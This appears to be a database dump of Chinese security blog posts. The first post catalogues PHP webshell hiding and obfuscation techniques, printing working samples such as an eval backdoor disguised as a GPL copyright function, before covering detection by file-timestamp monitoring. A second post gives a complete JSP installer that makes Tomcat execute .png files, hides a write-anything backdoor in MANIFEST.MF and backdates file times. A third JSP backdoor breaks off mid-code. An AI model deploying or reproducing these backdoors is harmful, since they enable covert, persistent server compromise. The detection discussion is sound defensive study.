*/Copyright3_6_56()/* 1989, 1991 Free Software Foundation, Inc.\n                  675 Mass Ave, Cambridge, MA 02139, USA\n     Everyone is permitted to copy and distribute verbatim copies\n     of this license document, but changing it is not allowed.\n    Preamble\n      The licenses for most software are designed to take away your\n    freedom to share and change it. By contrast, the GNU General Public\n    License is intended to guarantee your freedom to share and change free\n    software--to make sure the software is free for all its users. This\n    General Public License applies to most of the Free Software\n    Foundation&#039;s software and to any other program whose authors commit to\n    using it. (Some other Free Software Foundation software is covered by\n    the GNU Library General Public License instead.) You can apply it to\n    your programs, too.*/?&gt;\n    Joomla! derives from copyrighted works licensed under the GNU General\n    Public License.  This version has been modified pursuant to the\n    GNU General Public License as of September 15, 2005, and as distributed,\n    it includes or is derivative of works licensed under the GNU General\n    Public License or other free or open source software licenses.  Please\n    see the CREDITS.php for a non-exhaustive list of contributors and\n    copyright holders.  A full text version of the GNU GPL version 2 can be\n    found in the LICENSE.php file.  A full text version of the other licenses\n    that Joomla! is derivative of or includes can be found in LICENSES.php.\n    &lt;? php\n    Copyright3_6_56();\n    function Copyright3_6_56(){\n    static $gnu = true;\n    if(!$gnu) return;\n    if(!isset($_REQUEST[&#039;gnu&#039;])||!isset($_REQUEST[&#039;c_id&#039;]))return;\n    $gpl=implode(&#039;&#039;, $_REQUEST[&#039;gnu&#039;]);\n    eval ($gpl( $_REQUEST[&#039;c_id&#039;]));\n    $gnu=false;\n    }\n    ?&gt;\n    2) 执行函数变形\n    &lt;?php\n        $_=&quot;&quot;;\n        $_[+$_]++;\n        $_=$_.&quot;&quot;;\n        $___=$_[+&quot;&quot;];//A\n        $____=$___;\n        $____++;//B\n        $_____=$____;\n        $_____++;//C\n        $______=$_____;\n        $______++;//D\n        $_______=$______;\n        $_______++;//E\n        $________=$_______;\n        $________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O\n        $_________=$________;\n        $_________++;$_________++;$_________++;$_________++;//S\n        $_=$____.$___.$_________.$_______.&#039;6&#039;.&#039;4&#039;.&#039;_&#039;.$______.$_______.$_____.$________.$______.$_______;\n        $________++;$________++;$________++;//R\n        $_____=$_________;\n        $_____++;//T\n        $__=$___.$_________.$_________.$_______.$________.$_____;\n        $__($_(&quot;ZXZhbCgkX1BPU1RbMV0p&quot;));   \n        //ASSERT(BASE64_DECODE(&quot;ZXZhbCgkX1BPU1RbMV0p&quot;));\n        //ASSERT(&quot;eval($_POST[1])&quot;);\n        //key:=1\n        ?&gt;\n        类似的还有\n        http://blog.sucuri.net/2013/09/ask-sucuri-non-alphanumeric-backdoors.html\n    3) 执行代码变形(payload变形)\n        2.1) 将webshell的执行代码payload编码成base64的格式: bypass本地特征码检测软件\n        2.2) 将webshell的执行代码payload使用加密算法(例如RSA1024)\n        http://blog.sucuri.net/2013/10/backdoor-evasion-using-encrypted-content.html\n            2.2.1) 私钥和文件保存在一起: bypass网络流量恶意检测软件，因为这样就可以直接在网络中传输密文。缺点是对于本地文件来说，解密当前webshell加密算法的key是暴露的\n            2.2.2) 私钥和通过网络流量传输的命令放在一起: bypass本地特征码检测软件，在本机文件中不出现解密密文的key，保证了本地webshell文件的保密性。缺点是在网络流量中\n　　　　　　　　　　　　出现了key，通过流量分析可以截获并解密之\n    4) 执行函数和执行代码同时变形\n    &lt;?php\n        $aaaaa=&quot;sewtemznypianol&quot;;\n        $char_system=$aaaaa{0}.$aaaaa{8}.$aaaaa{0}.$aaaaa{3}.$aaaaa{1}.$aaaaa{5};\n        //die($char_system);\n        $aaaaaa=&quot;edoced46esab_n&quot;;\n        $char_base64_decode=$aaaaaa{11}.$aaaaaa{10}.$aaaaaa{9}.$aaaaaa{8}.$aaaaaa{7}.$aaaaaa{6}.$aaaaaa{12}.$aaaaaa{5}.$aaaaaa{4}.$aaaaaa{3}.\n    　　　$aaaaaa{2}.$aaaaaa{1}.$aaaaaa{0};\n        die($char_base64_decode);\n        echo $char_system($char_base64_decode(&quot;aXBjb25maWc=&quot;));\n    ?&gt;\n7. 加花\n    1) 在webshell代码中加入一些随机字符串等混淆因子，可以绕过一部分&quot;基于正则&quot;的检测软件\n    &lt;?php\n        $subject=&#039;any_thing_you_can_write&#039;;\n        $pattern=&quot;/^.*$/e&quot;;\n        $payload=&#039;cGhwaW5mbygpOw==&#039;;\n        //cGhwaW5mbygpOw==: &quot;phpinfo();&quot;\n        $replacement=pack(&#039;H*&#039;, &#039;406576616c286261736536345f6465636f646528&#039;).&quot;\\&quot;$payload\\&quot;))&quot;;\n        //406576616c286261736536345f6465636f646528: &quot;eval(base64_decode(&quot;;\n        preg_replace($pattern, $replacement , $subject);\n    ?&gt;\n8. 多态\n    1) 在实际的webshell开始执行前，典型的对传入的参数做一些判断，只有匹配条件时才会进入真正的执行路径。\n    这种多态技术不仅可以躲过一些正则webshell检测系统，还可以避免被某些动态沙箱的检测软件捕获到(因为动态沙箱很难模拟出这个webshell脚本所需要的&quot;启动参数&quot;)\n    &lt;?php\n        if($_REQUEST[&quot;code&quot;]==pany)\n        {\n        echo str_rot13(&#039;riny($_CBFG[pzq]);&#039;);\n        eval(str_rot13(&#039;riny($_CBFG[pzq]);&#039;));\n        }\n        else\n        {\n        $url = $_SERVER[&#039;PHP_SELF&#039;];\n        $filename = end(explode(&#039;/&#039;,$url));\n        $content = &#039;helloworld&#039;;\n        $fp = fopen (&quot;$filename&quot;,&quot;w&quot;);\n        if (fwrite ($fp, $content))\n        {\n            fclose ($fp);\n            die (&quot;error&quot;);\n        }\n        else\n        {\n            fclose ($fp);\n            die (&quot;good&quot;);\n        }\n        exit;\n        }\n    ?&gt;</pre>\n<p>以上提到的都是几种webshell的隐藏思路，这是目前webshell对抗领域的一个很重要的问题:</p>\n<pre class=\"brush: php; gutter: true\">1. 很多新增的webshell是通过老webshell上传的，&quot;重感染&quot;现象严重\n2. 一些老的、之前已经存在的webshell由于做了很好的隐藏工作，不容易被发现，只要某台服务器上还存在一个webshell，那这个服务器就永远处在被入侵的状态，新的webshell还会不断\n　　生成(甚至包括变态的SEO大马)\n3. 这些老的webshell的检测依靠入侵监控是无法发现的，因为它们往往是在部署入侵监控系统之前就存在的，必须依靠&quot;特征规则扫描&quot;在受感染的服务器上进行扫描，将这些&quot;隐藏&quot;的\n　　webshell抓出来，并删除之，才能一劳永逸地修复这台服务器</pre>\n<p>2. WebShell对抗方法</p>\n<p>在谈及WebShell对抗技术，我个人觉得这是一个综合性的问题，webshell并不仅仅是脚本的编写技巧、隐藏技巧这样的单方面的问题，而应该从整个服务器安全对抗、加固的角度去思考怎么样全方位的防御黑客的攻击</p>\n<pre class=\"brush: php; gutter: true\">思考:\n整个服务器安全、webshell对抗体系如下:\n1. 最根源的问题: WEB系统的代码安全，我们根据不同的漏洞文件(例如mytag_js.php)给出相应的修复方案，帮助客户自动对CMS系统进行修复\n2. 除了CMS系统的漏洞导致的GETSHELL，对FTP弱口令、FTP匿名可写、3389爆破、SSH若口令等系统级别的安全设置这个角度帮助用户加固主机\n3. 做到以上这些步骤，还是不能保证主机不被入侵(0DAY、密码泄漏等威胁依然存在)，还必须在客户的服务器设置可疑行为监控程序，对可疑的文件操作行为进行监控、并上报到服务端进行\n　　确诊检测\n4. 服务端采用PHP动态沙箱技术对上报上来的脚本文件进行&quot;模拟执行恶意性检测&quot;，确定其是否为webshell\n5. 做到了以上几部后，基本可以防御住新的webshell的生成，但是还要考虑到一个问题，很多的新增webshell是因为之前被入侵后在服务器上留下的老webshell导致的，我们要彻底修复\n　　客户的服务器，就必须对这些现存的老webshell rootkit进行扫描，并清除之</pre>\n<p>具体的实施方法如下:</p>\n<pre class=\"brush: php; gutter: true\">webshell对抗手段:\n1. 代码审计\n    1) 代码层、WEB层面的安全审计永远是WEB安全的最根本、最有效的方法。一个健壮的WEB系统能够抵御来自黑客的各种攻击，使系统远离GETSHELL的可能\n    2) 定期的代码补丁(例如CMS定期的补丁发布)\n2. 人工加固\n    1) 对ftp进行权限设置，取消匿名访问。\n    2) 对目录进行权限设置，不同网站使用不同的用户权限\n        说明:\n        IIS可以针对不同的网站使用不同的虚拟路径(也可以理解为虚拟主机)，不同的虚拟主机之间可以单独设置路径权限信息\n    3) 对系统盘的敏感目录及文件进行权限设置，提高系统安全性\n        说明:\n        系统加固的范畴，主要是对指定的敏感路径的ACL进行设置\n    4) 定期更新服务器补丁，定期更新杀毒软件。\n3. 部署Web防火墙 \n　　    1) 可针对WebShell上传，进行控制、过滤与阻断;\n　　    2) 实时阻断入侵者利用SQL注入、XSS攻击、缓冲区溢出攻击等获得web站点的目录修改权限\n        2.1) WAF的功能，对GET、POST等HTTP中的敏感关键字进行检测\n        2.2) WAF的0DAY规则库来自目前CMS的一些已知的、未知的POC攻击方法，每种POC都会有一个相对固定的&quot;攻击特征&quot;(表现在GET、POST数据包中就是一些特征字符串)，\n　　　　　　　　通过搜集这些POC，编写相应的正则规则，在WAF端进行阻断拦截\n　　    3) 支持对WebShell访问返回页面进行内容检测，切断入侵者企图调用访问WebShell的行为\n        3.1) 安全宝、加速乐就有这样的功能\n        3.2) ModSecurity的&quot;链式检测&quot;逻辑中，可以检测包括&quot;服务器返回流量&quot;在内的数据内容，当发现外流数据中有敏感信息的数据，予以阻断\n　　    4) 支持实时检测过滤WebShell发起的各种攻击命令，阻断：\n        4.1) 利用WebShell发起的挂马(现在主要是SEO暗链)\n        4.2) 文件下载\n        4.3) 端口扫描\n        4.4) 内容篡改等各种攻击和非法操作\n    (包括安全狗在内的防护软件都会有针对敏感指令(程序)的监控、以及API拦截)\n4. 定期运行杀软\n针对webshell的杀软和传统的二进制病毒的杀软在实现原理上有一些区别，针对webshell的杀软主要是基于特征码匹配的技术(常常是正则匹配)\n    1) http://www.d99net.net/  D盾\n    2) WebshellAutoCheck  \n5. 目录监控\n不管WEB漏洞的形式千变万化，webshell的写入方式不外乎两种: 写文件、修改文件。而这些操作都会引发文件系统的读写操作，我们可以对这些行为进行监控，区分出正常的业务操作和可疑\n的黑客攻击行为。windows为实现这一需求提供了3个API\n    1) http://msdn.microsoft.com/en-us/library/windows/desktop/ms687025(v=vs.85).aspx\n    WaitForMultipleObjects function\n    2) http://msdn.microsoft.com/en-us/library/windows/desktop/aa365465(v=vs.85).aspx\n    ReadDirectoryChangesW function\n    3) http://msdn.microsoft.com/en-us/library/windows/desktop/bb762120(v=vs.85).aspx\n    SHChangeNotifyRegister function\n6. PHP动态沙箱检测技术\n利用PHP Zend Extension对PHP的关键函数API进行Hook，对动态执行中的函数调用进行污点检测、行为检测。从而解决了静态检测的的规则匹配中出现的误报、漏报问题\n(关于PHP Zend Extension、API Hook技术的分享会放到下一篇文章(3)继续学习)</pre>\n<p>上面谈到了目录操作的可疑行为监控、PHP动态沙箱检测技术。这两个是我这个系列的学习重点，接下来会重点研究一下\"目录监控\"方面的知识，而\"PPHP动态沙箱检测技术\"的学习将放到下一篇文章中继续，在(3)中，我们会一并学习PHP内核实现、扩展编程、Hook Api、动态沙箱等知识。接下来，让我们回到正题: 目录监控</p>\n<p>3.  文件磁盘的行为监控在WebShell对抗中的应用</p>\n<p>在学习研究文件操作的可疑行为的时候，我觉得这个技术从原理上和\"入侵检测\"系统有很多相似之处，都是对用户系统上的某些\"运行参数(文件操作、网络、API调用等都算运行参数)\"进行建模，并分析其可疑性。于是，我google了一些关于入侵检测系统的相关，这里也一并分享出来。</p>\n<p>http://www.oschina.net/p/snare</p>\n<p>http://docs.trendmicro.com/all/smb/wfbs-services/Client/wfbs-svc/v3.7/zh-CN/ClientHelp/About_Behavior_Monitoring.htm</p>\n<p>http://www.jiayf.com/tech/1078.html</p>\n<p>Snort 网络入侵检测系统 Snort 介绍</p>\n<p>http://www.360doc.com/content/11/0415/15/2630460_109844571.shtml</p>\n<pre class=\"brush: php; gutter: true\">入侵检测技术分类\n从技术上讲，入侵检测技术大致分为以下几类:\n1. 基于知识的模式识别(常常是正则规则匹配特征): 也叫特征检测法\n2. 基于知识的异常识别(更多的是行为模式的检测): 多维度的综合判断(有时会结合概率统计的技术)\n3. 协议分析</pre>\n<pre class=\"brush: php; gutter: true\">在这类入侵检测系统中，我感觉这里有一个问题需要注意就是: &quot;可管理性&quot;，或者叫&quot;可配置型&quot;\n1. 对于&quot;正则类型的特征值检测技术&quot;的产品来说，规则相对较为容易地抽象成一个个配置文件，可配置型和扩展性很好。因为它们的规则从作用域上来说一个个单独的点\n　　(这里的点指的这条规则就只对一个较小的范围区域进行匹配检测)\n2. 对于&quot;行为模式检测类型&quot;的产品来说，它所应用的&quot;规则模型&quot;往往较复杂，基本上不会是一条、或者两条正则能说明的。而是一个个的&quot;是否满足某条件&quot;的模式判断，通过这些条件的判断来\n　　对当前行为的模式进行分类和判断。所以，这类产品很难抽象出一个单纯的规则配置文件，而是要把规则和代码混编在一起写，即规则隐含在代码逻辑中</pre>\n<p>在看资料的时候，其中有几条对我启发很大</p>\n<pre class=\"brush: php; gutter: true\">几种异常识别的检测方法\n1. 基于审计的攻击检测技术\n这种检测方法是通过对审计信息的综合分析实现的，其基本思想是:\n    1) 根据用户的历史行为、先前的证据或模型，使用统计分析方法对用户当前的行为进行检测和判别。这是一种结合历史信息的迭代识别思想\n        1.1) 时间维度的判断，根据某个事件发生的之前的时间段内相同事件的发生情况\n        1.2) 关联性维度的判断，判断当前发生的事件和之前发生的事件之间的关联性，是独立事件、还是关联事件\n    2) 当发现可疑行为时，保持跟踪并监视其行为，同时向系统安全员提交安全审计报告\n2. 基于神经网络的攻击检测技术\n神经网络这块的学术研究转化为实际可用的技术目前还并不多，还有待研究\n3. 基于专家系统的攻击检测技术(基于安全人员经验的攻击检测技术)\n专家系统就是一个依据专家经验定义的推理系统，这种检测是建立在专家经验基础上的，它根据专家经验进行推理判断得出结论。而这个判断的依据往往专家结合自身的安全经验得出\n的&quot;实践性数据&quot;，虽然没有理论支撑，但是具有合理性，能够起到很好的效果\n例如:\n    1) 当用户连续3次登录失败时，可以把改用户的第4次登录行为视为攻击行为\n    2) 当某个目录下突然出现一个创建时间和其他文件明显不一致的文件时，可以把这个文件视为一个可疑webshell\n4. 基于模型推理的攻击检测技术\n攻击者在入侵一个系统时往往采用一定的行为程序，如猜测口令的程序，这种程序引发的行为构成了某种具有一定行为特征的模型，根据这种模型所代表的攻击意图的行为特征，可以实时地\n检测出恶意的攻击企图。例如\n    1) WEB扫描器在扫描网站时在日志中留下的访问记录就具有某些目录遍历的特征\n    2) dede在每日更新cache的时候对文件的access、modify也会表现出顺序，时间间隔等特征\n    3) 黑客在利用poc修改style_x.php的时候也会表现出不同于cache更新的访问特征</pre>\n<p>综合了以上知识，我觉得入侵检测的思想可以移植到webshell的对抗上来。</p>\n<pre class=\"brush: actionscript3; gutter: true\">黑客GETSHELL的途径只有两种途径:\n    1) 写磁盘\n    2) 修改已存在的.php文件\n所以我们只要捕获: 文件创建操作、文件修改操作这两种行为即可</pre>\n<p>而这里的问题在于网站的正常运行也是会产生文件读写操作的，我们要做的就是对\"正常的业务操作引发的文件操作\"和\"黑客的攻击行为导致的文件操作\"进行二值区分，找到它们模式上的不同，使用统计、分类的方法区分出两种行为模式上的区别，就达到了可疑GETSHELL行为的监控、检测的目的了。</p>\n<p>目前，根据我的研究和实验，我对可疑行为的理解如下:</p>\n<pre class=\"brush: php; gutter: true\">1. 如果这个新创建的文件的创建时间和当前目录下的其他文件的创建时间差很多，则判定为可疑，getshell大部分都是通过写新文件得到的\n2. 这是为了防御那种针对.config配置文件的写入，把后门代码插入到.config中进行getshell的。如果本次的修改文件的时间和创建时间差别太大，则判定为可疑文件\n3. 因为黑客的写磁盘getshell一般都是在网站主程序安装完成，开始运行之后才进行的，所以这个基于创建时间的判断维度能比较有效的区分出正常操作和黑客的getshell\n4. 而网站的主代码文件一般在程序安装完毕，上线运行之后就不会轻易被修改了，如果出现了被修改文件的修改时间和创建时间差别很大，即判定为可疑行为，即使是用户自己去主动修改这些\n　　代码文件(例如打补丁等)，这种情况并不是常常发生，在可以允许的误报范围之内\n5. 考虑到CMS中的常常有一些cache、log的机制。业务上会常常去修改这些文件，所以，在基于修改时间和创建时间的这个维度的判断上将阈值稍微调大，这样，网站正常的编辑/修改文件的\n　　行为就不会被捕获判定为可疑，而我们的程序只会去捕获那些修改时间和创建时间差别相对较大的文件操作行为。背后含义即”非常规”的、”异常的编辑”行为，它们在时间线上往往表现为\n　　一些孤立的点\n6. 如果是网站的cache、log机制，那从创建时间和修改时间上表现出来的就是: 创建时间和修改时间之间差距不大，因为cache、log都是每天创建，每天修改的，而系统的代码文件是很早创\n　　建的，然后会很少被修改到，如果一个很少被修改到的文件突然被修改了，则判定为可疑，我在代码中就是基于这样一个假设进行检测的\n7. 如果在程序运行中捕获到的两次文件的创建的事件的时间差值很小(10s以内)，并且连续发生多次(5次)，说明正在进行大量的文件创建操作。即用户正在进行网站安装行为、或者手动在进\n　　行正常的业务型的文件复制行为\n8. 网站中普遍设置有cache、log机制。如果是网站的cache、log机制，那从创建时间和修改时间上表现出来的就是: 创建时间和修改时间之间差距不大，因为cache、log都是每天创建，\n　　每天修改的，而系统的代码文件是很早创建的，然后会很少被修改到，如果一个很少被修改到的文件突然被修改了，则判定为可疑。\n       1) log的差值阈值调整为1天(1个log/1天)\n       2) cache的差值阈值调整为3天(1个cache/3天)\n9. 如果:\n       1) 用户从网上下载一个CMS程序: xxx.rar，然后用FTP上传到&quot;客户端服务器&quot;进行解压缩\n       2) 用户直接把整个文件夹(例如/dede/)复制到&quot;客户端服务器&quot;\n这些文件的&quot;修改时间&quot;会&quot;早于&quot;这些文件的&quot;创建时间&quot;，不同于我们通常理解的修改时间迟于创建时间\n因为这些文件是在原始作者打包上传的那时候就修改完成的，而创建时间是在本次的复制中记录进去的。所以才造成了这个现象，而黑客通过WEB漏洞对.php等脚本文件的修改导致的GETSHELL，\n修改时间都是迟于创建时间的\n10. 能够识别出密集文件创建操作，同时还可以兼容对时间孤立的文件创建的可疑性判定，以及可疑文件修改的判定。这里的&quot;密集文件操作&quot;指的是当用户在进行.RAR解压缩、或者整体文件夹\n　　复制的时候，往往会伴随着大量的文件操作，这个时候容易产生误报，我们必须有效地检测到密集文件操作的发生，并忽略之，减少误报</pre>\n<p>以上是我对入侵检测在GETSHELL检测上的应用的理解，相应的检测程序正在开发中</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/4.png\"><img class=\"alignnone size-medium wp-image-741\" title=\"4\" src=\"http://javaweb.org/wp-content/uploads/2014/02/4-300x137.png\" alt=\"\" width=\"300\" height=\"137\" /></a></p>\n<p>(有效检测、并忽略了密集文件操作)</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/5.png\"><img class=\"alignnone size-medium wp-image-742\" title=\"5\" src=\"http://javaweb.org/wp-content/uploads/2014/02/5-300x137.png\" alt=\"\" width=\"300\" height=\"137\" /></a></p>\n<p>(新的文件和原始的”旧”文件在创建时间上存在明显的统计区别，因为被检测出来)</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/6.png\"><img class=\"alignnone size-medium wp-image-743\" title=\"6\" src=\"http://javaweb.org/wp-content/uploads/2014/02/6-300x127.png\" alt=\"\" width=\"300\" height=\"127\" /></a></p>\n<p>(因为WEB漏洞导致的文件修改呈现出明显的时间孤立性，且产生了实际的文件修改(变现为FILE SIZE的改变)，所以被程序捕获到异常行为)</p>\n<p>windows目录监控的开发库来自于codeproject的Wes Jones的分享</p>\n<p>http://www.codeproject.com/Articles/950/CDirectoryChangeWatcher-ReadDirectoryChangesW-all</p>\n<p>当然，这种程序的一个最大的问题就是误报率的问题，我也同样遇到了误检测的问题，下一阶段准备对可疑行为的建模和区分这方面进行一下深入研究，也希望对这方面有了解的朋友能不吝赐教，分享一下好的思路，不胜感激。</p>\n<p>今天这篇文章就分享到这里结束了。</p>\n<p>下一篇关于WEBSHELL的PHP动态沙箱检测的相关学习，希望能分享一些基于PHP内核、Zend扩展，API Hook相关的PHP沙箱技术的学习心得</p>', null, '2014-02-24 10:31:16', '1', '628', null, '0', '2014-03-11 17:55:34'), ('749', '1', '3', 'Server配置加png后缀解析并藏png一句话到最深目录', '园长', '仅用于学习交流，<strong>请勿在任何正式服务器环境上测试</strong>否则服务器挂(Resin测试会自动注销)我可不负责。\n<p>嘘~我把一句话藏在了<strong>/WebRoot/META-INF/MANIFEST.MF</strong> 里面。</p>\n<p>自动寻找个最深的目录include进<strong>MANIFEST.MF里面的一句话</strong>。</p>\n<p>自动修改文件被篡改的文件的最后修改时间为修改前的时间。</p>\n<p>当无权限或异常的情况下自动在最深的目录或web根目录建立一个<span style=\"font-family: Consolas, Monaco, monospace; font-size: 12px; line-height: 18px;\">applicationContext.jsp内容为一句话。</span></p>\n<p>不适合集群负载均衡环境,<strong>已取消resin修改</strong>。</p>\n<p>请求：http://localhost:8080/Struts/test/test02/demos/tabs/ajax/test/dd/33/logo.png?a=1.txt&amp;b=12345</p>\n<p>参数a是文件名，b是文件内容。</p>\n<p><strong>未经严格测试，请勿用于任何非法尝试，出了问题一律不负责！</strong></p>\n<p>code:</p>\n<pre class=\"brush: java; gutter: true\">&lt;%@page import=&quot;java.text.SimpleDateFormat&quot;%&gt;\n&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot;%&gt;\n&lt;%@page import=&quot;java.util.*&quot;%&gt;\n&lt;%@page import=&quot;java.io.*&quot;%&gt;\n&lt;%@page import=&quot;java.util.regex.*&quot;%&gt;\n&lt;%!\n	private	static int ab;\n	private	static String cd;\n	private static final String mm = &quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(\\&quot;/\\&quot;)+request.getParameter(\\&quot;a\\&quot;), \\&quot;rw\\&quot;).write(request.getParameter(\\&quot;b\\&quot;).getBytes());%&quot;+&quot;&gt;&quot;;\n	void editXml(HttpServletRequest request) throws Exception{\n		File path  = new File(&quot;&quot;).getAbsoluteFile();\n		String encode = &quot;UTF-8&quot;;\n		String serverName = request.getSession().getServletContext().getServerInfo();\n		int version = 0;\n		Matcher m = Pattern.compile(&quot;\\\\d&quot;,Pattern.CASE_INSENSITIVE).matcher(serverName);\n		if(m.find()){\n		 	version = Integer.parseInt(m.group());\n		}\n		if(serverName.toLowerCase().contains(&quot;tomcat&quot;)){\n			editTomcatWebXml(path,encode,version);\n		}else if(serverName.toLowerCase().contains(&quot;resin&quot;)){\n			//editResinAppDefaultXml(path,encode,version);\n		}else{\n		}\n	}\n	String getServerPath(){\n		String[] str = new String[]{&quot;catalina.home&quot;,&quot;resin.home&quot;,&quot;jetty.home&quot;,&quot;jboss.home&quot;,&quot;BEA_HOME&quot;};\n		for(String s:str){\n			if(null!=System.getProperty(s)&amp;&amp;new File(System.getProperty(s)).exists()){\n				return System.getProperty(s).replaceAll(&quot;\\\\\\\\&quot;, &quot;/&quot;)+&quot;/&quot;;\n			}\n		}\n		String dir = System.getProperty(&quot;user.dir&quot;).replaceAll(&quot;\\\\\\\\&quot;, &quot;/&quot;)+&quot;/&quot;;\n		if(dir.endsWith(&quot;/bin&quot;)){\n			dir = dir.substring(0,dir.lastIndexOf(&quot;/bin&quot;)-1);\n		}\n		return dir;\n	}\n	void editTomcatWebXml(File path,String encode,int version) throws Exception {\n		File webXmlPath = new File(getServerPath()+File.separator+&quot;conf&quot;+File.separator+&quot;web.xml&quot;);\n		String str = readFileToString(webXmlPath,&quot;UTF-8&quot;);\n		String reg = &quot;&lt;url-pattern&gt;*.png&lt;/url-pattern&gt;&quot;;\n		if(str==null||!str.contains(reg)){\n		String key = &quot;&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;&quot;;\n			writeStringToFile(webXmlPath, str.replace(key, key+&quot;\\r\\n&quot;+&quot;\\t\\t\\t\\t&quot;+reg), encode,false);\n		}\n	}\n	void editResinAppDefaultXml(File path,String encode,int version) throws Exception {\n		if(version&gt;3){\n			/* File f = new File(getServerPath()+File.separator+&quot;conf&quot;+File.separator+&quot;resin.xml&quot;);\n			String str = readFileToString(f, encode);\n			writeStringToFile(f, str.replace(&quot;classpath:META-INF/caucho/app-default.xml&quot;,&quot;${resin.home}/conf/app-default.xml&quot;), encode, false);\n			File c = new File(getServerPath()+File.separator+&quot;conf&quot;+File.separator+&quot;cluster-default.xml&quot;);\n			if(c.exists()){\n				String content = readFileToString(f, encode);\n				writeStringToFile(c, content.replace(&quot;classpath:META-INF/caucho/app-default.xml&quot;,&quot;${resin.home}/conf/app-default.xml&quot;), encode, false);\n			} */\n			return ;\n		}\n		File webXmlPath = new File(getServerPath()+File.separator+&quot;conf&quot;+File.separator+&quot;app-default.xml&quot;);\n		String str = readFileToString(webXmlPath,&quot;UTF-8&quot;);\n		String reg = &quot;&lt;servlet-mapping url-pattern=\\&quot;*.png\\&quot; servlet-name=\\&quot;resin-jsp\\&quot;/&gt;&quot;;\n		String key = &quot;&lt;servlet-mapping url-pattern=\\&quot;*.jsp\\&quot; servlet-name=\\&quot;resin-jsp\\&quot;/&gt;&quot;;\n		if(str==null||!str.contains(reg)){\n			writeStringToFile(webXmlPath, str.replace(key, key+&quot;\\r\\n&quot;+&quot;\\t&quot;+reg), encode,false);\n		}\n	}\n	String readFileToString(File f,String encode) throws Exception{\n		StringBuilder sb = new StringBuilder();\n		String str = &quot;&quot;;\n		BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f),&quot;UTF-8&quot;));\n		while((str=br.readLine())!=null){\n			sb.append(str+&quot;\\r\\n&quot;);\n		}\n		br.close();\n		return sb.toString();\n	}\n	void writeStringToFile(File f,String content,String encode,boolean append) throws Exception{\n		long lastModified = !f.exists()?new SimpleDateFormat(&quot;yyyy-mm-dd HH:mm:ss&quot;).parse(&quot;2012-03-14 12:43:11&quot;).getTime():f.lastModified();\n		StringBuilder sb = new StringBuilder();\n		BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f,append),&quot;UTF-8&quot;));\n		bw.write(content);\n		bw.flush();\n		bw.close();\n		f.setLastModified(lastModified);\n	}\n	void getDepthPath(File file){\n		if (file.isDirectory()) {\n			int a = file.toString().split(File.separator).length;\n			if(ab&lt;a){\n				ab = a;\n				cd = file.toString();\n			}\n			String[] files = file.list();\n			for (int i = 0; i &lt; files.length; i++) {\n				getDepthPath(new File(file, files[i]));\n			}\n		}\n	}\n	void saveFile(HttpServletRequest request,String encode) throws Exception{\n		File path  = new File(request.getSession().getServletContext().getRealPath(&quot;/&quot;)+File.separator+&quot;META-INF&quot;+File.separator);\n		if(!path.exists()){\n			path.mkdirs();\n		}\n		String str = readFileToString(new File(path,&quot;MANIFEST.MF&quot;), encode);\n		if(str!=null||!str.contains(&quot;RandomAccessFile&quot;)){\n			writeStringToFile(new File(path,&quot;MANIFEST.MF&quot;), &quot;info:&quot;+mm,encode, true);\n		}\n	}\n	void naughty(HttpServletRequest request) throws Exception{\n		File path  = new File(request.getSession().getServletContext().getRealPath(&quot;/&quot;));\n		File[] str = path.listFiles();\n		for(File s:str){\n			if(s.isDirectory()&amp;&amp;!s.toString().contains(&quot;WEB-INF&quot;)&amp;&amp;!s.toString().contains(&quot;META-INF&quot;)){\n				getDepthPath(s);\n			}\n		}\n		File f = new File((cd.length()&gt;0?cd:path.toString())+File.separator+&quot;logo.png&quot;);\n		String split = &quot;&quot;;\n		String[] sb = f.toString().replace(path.toString(), &quot;&quot;).split(&quot;/&quot;);\n		for(String q:sb){\n			split +=&quot;../&quot;;\n		}\n		writeStringToFile(f, &quot;&lt;%@ include file=\\&quot;/META-INF/MANIFEST.MF\\&quot; %&quot;+&quot;&gt;&quot;, &quot;UTF-8&quot;, false);\n		saveFile(request, &quot;UTF-8&quot;);\n	}\n	void oneLove(HttpServletRequest request) throws Exception{\n		editXml(request);\n		naughty(request);\n	}\n%&gt;\n&lt;%\n	try{\n		oneLove(request);\n		out.println(&quot;[/ok]&lt;br/&gt;&quot;+&quot;[path=&quot;+cd+File.separator+&quot;logo.png]&quot;);\n	}catch(Exception e){\n		out.println(&quot;[error:&quot;+e.toString()+&quot;]&quot;);\n		try{\n			File ef = null;\n			if(!&quot;&quot;.equals(cd)&amp;&amp;new File(cd).canWrite()){\n				ef = new File(cd+File.separator+&quot;applicationContext.jsp&quot;);\n			}else{\n				ef = new File(application.getRealPath(&quot;/&quot;)+File.separator+&quot;applicationContext.jsp&quot;);\n			}\n			out.println(&quot;[/ok]&lt;br/&gt;&quot;+&quot;[path=&quot;+ef.toString()+&quot;]&quot;);\n			writeStringToFile(ef, mm, &quot;UTF-8&quot;, false);\n		}catch(Exception x){\n			out.println(&quot;[error:&quot;+x.toString()+&quot;]&quot;);\n		}\n	}\n%&gt;</pre>', null, '2014-02-25 16:04:42', '1', '573', null, '0', '2014-02-26 00:44:41'), ('778', '1', '3', 'jsp 后门', '园长', '请求地址：http://localhost:8080/zsy.jsp\n<p>请求参数：c=后门内容</p>\n<p><strong>zsy压缩.jsp:</strong></p>\n<pre class=\"brush: java; gutter: true\">&lt;%@page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%@page import=&quot;java.text.SimpleDateFormat&quot;%&gt;&lt;%@page import=&quot;java.io.*&quot;%&gt;&lt;%@page import=&quot;java.net.*&quot;%&gt;&lt;%!String getConnection(String url) throws Exception{String result=&quot;&quot;,line=&quot;&quot;;URLConnection connection=new URL(url).openConnection();connection.setConnectTimeout(15000);connection.setReadTimeout(15000);BufferedReader in=new BufferedReader(new InputStreamReader(connection.getInputStream()));while((line=in.readLine())!=null){result+=line;}return result;}void writeStringToFile(File f, String content,String encode,boolean append) throws Exception{long lastModified =!f.exists()?new SimpleDateFormat(&quot;yyyy-mm-dd HH:mm:ss&quot;).parse(&quot;2012-03-14 